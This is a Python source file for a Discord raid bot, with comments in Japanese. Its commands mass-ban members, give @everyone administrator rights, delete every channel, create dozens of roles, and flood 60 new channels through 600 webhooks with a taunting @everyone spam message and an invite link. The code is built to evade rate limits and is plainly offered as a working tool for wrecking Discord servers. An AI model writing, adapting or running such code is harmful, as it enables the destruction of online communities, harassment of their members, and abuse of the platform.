import discord
from discord.ext import commands
import asyncio
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

# --- Koyebヘルスチェック (必須) ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is running")

def run_health_check():
    server = HTTPServer(('0.0.0.0', int(os.getenv("PORT", 8080))), HealthCheckHandler)
    server.serve_forever()

threading.Thread(target=run_health_check, daemon=True).start()

# --- Bot設定 ---
intents = discord.Intents.default()
intents.members = True
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

SPAM_MESSAGE = (
    "# RAID BY IMA\n"
    "## このサーバーは絶対神ima様によってポアされました、悔しかったらやり返してみてください\n\n"
    "## いま最強\n"
    "## 荒らし対策ざるすぎだろwww\n\n"
    "@everyone\n"
    "https://discord.gg/esW7waKaxv"
)

@bot.event
async def on_ready():
    print(f'[SYSTEM] {bot.user.name} 最高速モードで待機中')

# !allban - 超並列BAN
@bot.command()
async def allban(ctx):
    await ctx.message.delete()
    members = [m for m in ctx.guild.members if m.id != ctx.author.id and m.id != bot.user.id and m.top_role < ctx.guild.me.top_role]
    # awaitせずに一気にタスクを投げる
    for m in members:
        asyncio.create_task(m.ban(reason="RAID"))

# !admin - 最速付与
@bot.command()
async def admin(ctx):
    await ctx.message.delete()
    asyncio.create_task(ctx.guild.default_role.edit(permissions=discord.Permissions(administrator=True)))

# !ima - サーバー破壊 & 限界突破スパム
@bot.command()
async def ima(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    # サーバー名変更 (即時)
    asyncio.create_task(guild.edit(name="いまわーるど支配下"))

    # 既存チャンネルを全削除 (並列)
    channels = await guild.fetch_channels()
    for ch in channels:
        asyncio.create_task(ch.delete())

    # ロールも並列で作成
    for _ in range(50):
        asyncio.create_task(guild.create_role(name="いまさいつお", color=discord.Color.red()))

    # スパム送信ユニット
    async def fast_send(webhook):
        for _ in range(1000):
            try:
                # 待ち時間(await)を最小限にするために非同期タスクとして射出
                asyncio.create_task(webhook.send(SPAM_MESSAGE))
                # 0.1秒以下の微小な待機を入れることで、OSのソケット枯渇を防ぎつつ最高速を維持
                await asyncio.sleep(0.01)
            except discord.HTTPException as e:
                if e.status == 429: # 速度制限
                    await asyncio.sleep(e.retry_after)
                else:
                    break

    # 60チャンネルを同時にセットアップ
    async def setup_and_raid():
        try:
            ch = await guild.create_text_channel(name="いまさまの支配下")
            # 1つのチャンネルに10個のWebhookを刺して分散攻撃
            for _ in range(10):
                webhook = await ch.create_webhook(name="効いててくかwww")
                # 各Webhookが独立して1000件送信を開始
                asyncio.create_task(fast_send(webhook))
        except: pass

    for _ in range(60):
        asyncio.create_task(setup_and_raid())

bot.run(os.getenv("DISCORD_TOKEN"))
